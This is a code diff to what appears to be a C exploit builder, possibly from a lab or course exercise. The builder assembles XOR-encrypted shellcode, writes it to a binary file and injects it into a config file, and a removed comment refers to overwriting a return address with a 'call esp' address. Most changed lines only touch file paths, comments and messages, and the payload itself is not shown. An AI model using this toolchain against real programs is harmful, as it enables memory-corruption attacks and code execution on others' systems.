@@ -83,8 +83,10 @@ void __stdcall shell_code()
 		mov eax, ebp
 		add eax, XOR_CODE_SZ
 
-		// need this to add for decrypting code (gained by value matching in immunity debugger)
-		add eax, 4				
+		// add these four bytes to fix start position for decryption
+		// (gained by forcing values in debugger)
+		add eax, 4	
+
 		mov begin, eax
 	}
 
@@ -392,9 +394,9 @@ void __declspec(naked) END_SHELLCODE(void) {}
 
 //////////////
 
-#define SHELLCODE_FILE		"shellcode.bin"
-#define CONFIG_FILE			"config_23"
-#define CONFIG_FILE_COPY	"config_23_copy"
+#define SHELLCODE_FILE		"Files\\shellcode.bin"
+#define CONFIG_FILE			"Files\\config_23"
+#define CONFIG_FILE_COPY	"Files\\config_23_copy"
 
 // gets file size in bytes
 unsigned getFileSize(char* path)
@@ -487,7 +489,7 @@ BOOL sc_write_conf(char *path, char* path_to)
 		free(pbuf); CloseHandle(hfile); return FALSE;
 	}
 
-	// overwrite return address by call esp address
+	// write config
 	if (!WriteFile(hfile, pbuf, size, (LPDWORD)&written, NULL)) {
 		printf("Error, can't write shellcode data\n");
 		free(pbuf); CloseHandle(hfile); return FALSE;
@@ -533,8 +535,8 @@ BOOL sc_write_bin(char *path)
 
 	if (xor_code_size != XOR_CODE_SZ || active_code_size != ACTIVE_CODE_SZ)
 	{
-		printf("Need to change constant XOR_CODE_SZ to %d\n", xor_code_size);
-		printf("Need to change constant ACTIVE_CODE_SZ to %d\n", active_code_size);
+		printf("Need to update constant XOR_CODE_SZ to %d\n", xor_code_size);
+		printf("Need to update constant ACTIVE_CODE_SZ to %d\n", active_code_size);
 		return FALSE;
 	}
 
@@ -571,11 +573,10 @@ BOOL sc_write_bin(char *path)
 int main(int argc, char *argv[])
 {
 	// clear config file
-	CopyFile("..\\Release\\"CONFIG_FILE_COPY, "..\\Release\\"CONFIG_FILE, FALSE);
 	CopyFile(CONFIG_FILE_COPY, CONFIG_FILE, FALSE);
 
 	// write shell code to bin file
-	if (!sc_write_bin(SHELLCODE_FILE) || !sc_write_bin("..\\Release\\"SHELLCODE_FILE))
+	if (!sc_write_bin(SHELLCODE_FILE))
 	{
 		printf("Unable to write shell to binary file. Exitting\n");
 		getchar();
@@ -583,8 +584,7 @@ int main(int argc, char *argv[])
 	}
 
 	// write shell code from bin to conf file
-	if (!sc_write_conf(SHELLCODE_FILE, CONFIG_FILE) 
-		|| !sc_write_conf("..\\Release\\"SHELLCODE_FILE, "..\\Release\\"CONFIG_FILE))
+	if (!sc_write_conf(SHELLCODE_FILE, CONFIG_FILE))
 	{
 		printf("Unable to write shell to config file. Exitting\n");
 		getchar();
